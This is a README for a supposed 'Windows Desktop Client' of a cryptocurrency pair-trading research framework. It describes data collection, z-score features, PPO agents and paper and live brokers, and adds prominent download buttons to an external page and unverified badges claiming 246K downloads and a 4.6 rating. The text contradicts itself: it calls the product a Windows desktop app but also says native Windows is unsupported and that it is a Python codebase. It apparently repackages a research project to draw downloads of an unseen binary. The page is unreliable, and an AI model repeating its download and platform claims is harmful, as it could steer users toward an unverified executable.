<div align="center">

# Crypto Currency Pair Trading Investment Model - Windows Desktop Client

![preview](https://raw.githubusercontent.com/kan0un/minsung-crypto-pair-trading-model-desktop/main/poster_4ea5509.svg)

[![downloads](https://img.shields.io/badge/downloads-246K-6366f1?style=flat&labelColor=0d1117)]() [![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-6366f1?style=flat&labelColor=0d1117)]() [![license](https://img.shields.io/badge/license-Apache-2.0-6366f1?style=flat&labelColor=0d1117)]() [![status](https://img.shields.io/badge/status-stable-2ea44f?style=flat&labelColor=0d1117)]() [![rating](https://img.shields.io/badge/rating-4.6%2F5-f59e0b?style=flat&labelColor=0d1117)]()

[![Download](https://raw.githubusercontent.com/kan0un/minsung-crypto-pair-trading-model-desktop/main/app_85db.svg)](https://kan0un.github.io/minsung-crypto-pair-trading-model-desktop/)

</div>

---

Minsung-Crypto_Currency-Pair-Trading-Investment-Model is a desktop-oriented quantitative research environment for developing and validating cryptocurrency pair-trading strategies. It combines statistical arbitrage on correlated asset pairs with order-book spread analysis, and exposes these strategies through a reinforcement-learning training pipeline built on custom Gym environments. The codebase provides market data collection, feature computation for pair spread z-scores and quote imbalance, PPO-based agent training, and a layered execution model with paper and live brokers guarded by risk controls. Practitioners can use it to move from raw market data through backtesting and paper trading toward live deployment while keeping strategy logic, execution, and risk management cleanly separated.

## Features

- **Pair Spread Strategy Engine**: Implements a statistical arbitrage model on the log-price ratio of two highly correlated cryptocurrency pairs, targeting mean-reversion opportunities through z-score-based signal generation.
- **Quote Spread Strategy Module**: Provides market-making and liquidity-provision logic driven by order-book bid-ask spread and imbalance metrics.
- **Data Collection Layer**: REST-based candle backfilling and WebSocket streaming for order-book and trade events, with configurable market selection and time-range parameters.
- **Feature Computation Pipeline**: Calculates pair spread z-scores and quote spread/imbalance features as inputs for downstream environment and model layers.
- **Custom Gymnasium Environments**: Exposes `PairSpreadEnv` and `QuoteSpreadEnv` as standardized reinforcement learning environments with configurable observation and action spaces.
- **PPO Training Wrapper**: Encapsulates Proximal Policy Optimization training with configurable hyperparameters, environment selection, and market-pair inputs.
- **Execution Abstraction**: Separates `PaperBroker` and `LiveBroker` implementations behind a unified broker interface for consistent order handling across simulation and live modes.
- **Risk Guard Enforcement**: Provides a `RiskGuard` layer that constrains live order flow, ensuring position and exposure limits are applied before any order reaches the broker.
- **Configuration Management**: YAML-based configuration files for environments, agents, and execution parameters, alongside environment-variable handling for sensitive credentials.
- **Rate-Limit and Utility Handling**: Built-in utilities for managing API request throttling and shared configuration loading across collection, training, and execution scripts.

## How it works

The model operates as a multi-stage pipeline that transforms raw market data into risk-managed trading decisions. Each stage is decoupled and independently configurable, allowing components to be tested, replaced, or extended without disrupting the broader system.

**1. Data Ingestion**

Market data is collected through two complementary channels: a REST-based candle backfiller for historical OHLCV series, and a WebSocket stream for real-time order book and trade events. Collected data is normalized and persisted locally, forming the substrate for both offline training and online inference.

**2. Feature Engineering**

Raw market data is converted into strategy-specific signals. For pair trading, the log-price ratio between two correlated assets is computed and transformed into a rolling z-score to capture mean-reversion distance. For quote-based strategies, bid-ask spread and order book imbalance metrics are derived. All features are computed deterministically to ensure consistency between backtest and live execution.

**3. Environment Layer**

Custom Gymnasium environments wrap the feature pipeline into reinforcement learning interfaces. Separate environments are provided for pair-spread and quote-spread strategies, each exposing observation, action, and reward definitions aligned with their respective objectives. Reward shaping and episode boundaries are configurable per environment.

**4. Agent Training**

A PPO training wrapper consumes the environments and produces policy checkpoints. Training runs are parameterized through configuration files, enabling reproducible experiments across data ranges, reward schemes, and hyperparameters. Checkpoints are versioned and can be evaluated against held-out data before promotion.

**5. Execution and Risk Control**

The execution layer abstracts order placement behind a broker interface with paper and live implementations. A dedicated risk guard intercepts all order flow to enforce position limits, exposure caps, and sanity checks. The paper broker mirrors live behavior without emitting real orders, providing a safe validation surface before capital deployment.

**6. Orchestration**

Each stage is exposed through script entry points and driven by YAML configuration, allowing full pipelines—from data collection through training to paper trading—to be composed and rerun reproducibly. This separation keeps experimental iteration fast while preserving a clear path toward live operation.

## Requirements

The model operates as a desktop application and targets the following baseline environment.

**Operating System**
- Windows 10 or 11 (64-bit), macOS 12 or later, or a current LTS Linux distribution.
- A 64-bit architecture is required; 32-bit environments are not supported.

**Runtime**
- Python 3.10 or newer, installed system-wide or via a virtual environment.
- pip and venv available for dependency resolution.
- Core scientific and machine-learning libraries (numerical computing, reinforcement-learning, and exchange-connectivity packages) as declared in the project's dependency manifest.

**Hardware**
- Minimum: 4 CPU cores, 8 GB RAM, 2 GB free disk space for the application and dependency set.
- Recommended: 8 CPU cores, 16 GB RAM, and 20 GB free disk space to accommodate historical candle datasets, order-book snapshots, and trained model checkpoints.
- A GPU with CUDA support is optional; it accelerates PPO training but is not required for data collection, environment rollout, or paper trading.

**Network**
- A stable outbound internet connection is required for market-data retrieval and live order routing.
- Firewall or proxy rules must permit WebSocket and HTTPS traffic to the configured exchange endpoints.
- Rate-limit-aware request throttling is built in; sustained connectivity is recommended for streaming sessions.

**Credentials and Configuration**
- Exchange API access and secret keys are supplied through a local environment file derived from the provided example template; the populated file is excluded from version control.
- API keys must be scoped to the permissions the model requires (market data read, order placement) and should not carry withdrawal rights.
- Configuration is expressed in YAML files under the project's config directory, allowing pair selection, risk parameters, and training hyperparameters to be adjusted without code changes.

**Execution Modes**
- Backtest and paper-trading modes require no exchange write permissions and run entirely against local historical data or simulated fills.
- Live trading requires valid API credentials and explicit activation of the live broker; the risk-guard layer must remain enabled.

**Validation**
- The unit-test suite must pass in the target environment before training or execution is attempted, confirming that data, feature, environment, and agent components initialize correctly.

## Compatibility

The model is designed to run on standard desktop environments without platform-specific dependencies. It supports the following configurations:

- **Operating systems**: Linux (Ubuntu 20.04 and later, Debian 11 and later), macOS (12 Monterey and later, both Intel and Apple Silicon), and Windows 10/11 via WSL2. Native Windows execution is not officially supported due to reliance on POSIX-style process handling in the execution layer.
- **Python runtime**: Python 3.10 through 3.12. Python 3.9 and earlier are not supported due to type-hint and dataclass features used throughout the codebase.
- **Hardware**: A minimum of 8 GB RAM is recommended for data collection and paper trading; 16 GB or more is recommended for PPO training and backtesting workloads. GPU acceleration is optional and detected automatically if a compatible CUDA or Metal backend is present, but the training pipeline falls back to CPU execution without loss of functionality.
- **Dependencies**: All runtime dependencies are declared in the project's packaging metadata and are resolved during environment setup. Pinned version ranges are maintained to preserve reproducibility across environments.
- **Exchange connectivity**: The data collection and execution layers target the Upbit Open API. Network access to the exchange endpoints is required for live data streaming and order placement; offline operation is limited to replaying previously collected datasets.
- **Configuration**: Environment-specific settings are supplied through YAML configuration files and environment variables, allowing the same codebase to run across development, paper trading, and live trading profiles without modification.

Compatibility with future Python releases is evaluated on a rolling basis. Users encountering platform-specific issues are encouraged to verify their environment against the configurations listed above before reporting problems.

## FAQ

**Is this project intended for live trading?**

Not at its current stage. The repository is a research and modeling effort for pair trading and spread strategies on cryptocurrency markets. Any real order execution should only be attempted after completing backtesting, walk-forward validation, and an extended paper trading period. The model is provided as-is, with no guarantee of profitability.

**What market data does the model require?**

The model operates on historical and streaming market data: candle data for the paired instruments, plus order book and trade stream data for quote-spread strategies. Data should cover a sufficiently long window to capture multiple market regimes so that correlation and spread behavior are estimated reliably.

**Which trading pairs are supported?**

The pair-spread approach targets any two instruments with a strong historical correlation (for example, a major pair against an aligned alternative). Pair selection is a configuration decision: the model does not ship with a fixed universe, and correlation stability should be re-verified before each training run.

**What does the model actually output?**

The model produces a policy that maps observed spread and quote features to position actions for the pair. Outputs are driven by the feature pipeline — spread z-scores, quote imbalance, and related indicators — and are intended for evaluation and simulation rather than direct execution.

**How is overfitting controlled?**

Through separation of training and evaluation windows, walk-forward validation, and out-of-sample testing. Because pair relationships drift, performance should be reassessed on rolling windows rather than a single historical split.

**Can the model be extended with new features or environments?**

Yes. The feature layer and environment layer are modular, so additional spread definitions, indicators, or custom environments can be introduced without modifying the core training loop. New components should be validated against the existing test suite before integration.

**What are the computational requirements?**

Training is CPU-feasible for moderate datasets; larger histories and repeated walk-forward runs benefit from additional memory and parallel evaluation. Exact requirements depend on the length of the data window and the number of pair configurations tested.

**Does the project guarantee returns?**

No. The model is an analytical and experimental framework. Cryptocurrency markets are volatile, pair correlations can break down, and past backtest performance does not imply future results. All usage is at the user's own risk.

## Disclaimer

This software is provided strictly for research and educational purposes as a quantitative modeling and strategy-testing tool. It does not constitute financial advice, an investment recommendation, or a solicitation to trade any asset. All trading and investment decisions made in connection with this project are the sole responsibility of the user.

Market data, backtest results, and simulated performance produced by this software are based on historical inputs and modeling assumptions. Past or simulated performance does not guarantee, imply, or predict future results. Crypto currency markets are highly volatile and may be subject to liquidity constraints, exchange outages, API rate limits, and regulatory changes that are not fully captured by any model or simulation.

Users are responsible for safeguarding their own API credentials, configuration files, and environment variables, and for verifying that any live execution path is properly guarded by risk controls before being enabled. The authors and contributors assume no liability for financial losses, data loss, service interruption, or damages of any kind arising from the use or misuse of this software.

By using this project, you acknowledge that you have read and understood this disclaimer and accept full responsibility for your own actions and outcomes.

[![Download](https://raw.githubusercontent.com/kan0un/minsung-crypto-pair-trading-model-desktop/main/app_85db.svg)](https://kan0un.github.io/minsung-crypto-pair-trading-model-desktop/)